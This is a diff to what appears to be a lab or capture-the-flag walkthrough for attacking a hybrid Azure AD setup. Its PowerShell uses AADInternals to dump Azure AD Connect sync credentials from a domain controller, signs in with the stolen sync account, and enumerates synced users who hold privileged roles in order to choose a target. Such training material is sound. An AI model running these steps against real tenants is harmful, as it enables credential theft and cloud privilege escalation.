@@ -54,7 +54,7 @@
     
     1. Find a way to compromise a synced user in order to jump to the cloud
 
-    2. Recon for roles / permissions to see which user you want to compromise
+    2. Recon for roles / azure permissions to see which user you want to compromise
 
     3. it's not "user1"...
 </details>
@@ -70,7 +70,8 @@
 
 <details>
 <summary><b>Solution</b></summary>
-    
+on the DC VM:
+
 ```powershell
 Import-Module AADInternals
 Get-AADIntSyncCredentials
@@ -80,9 +81,10 @@ Login using dumped Sync_XX account:
 ```powershell
 # Prompt for credentials and retrieve & store access token to cache
 # Enter your dumped Sync_XX account creds!
-$tenantId = "YOUR_TENANT_ID"
-$at = Get-AADIntAccessTokenForAADGraph -SaveToCache
-Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id
+$at = Get-AADIntAccessTokenForAADGraph
+$tenant = Get-AADIntSyncConfiguration # get the tenant ID
+
+Connect-AzureAD -AadAccessToken $at -TenantId $tenant.TenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id
 ```
 
 Enumerate users:
@@ -98,6 +100,7 @@ $onpremSyncedUsers | ForEach-Object {
         Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='ImmutableId';Expression={$user.ImmutableId}}, @{Name='Role';Expression={$role.DisplayName}} 
     } 
 } | Format-Table -Wrap -AutoSize
+
 ```
 Target user2, as he holds a privileged role.. 
 
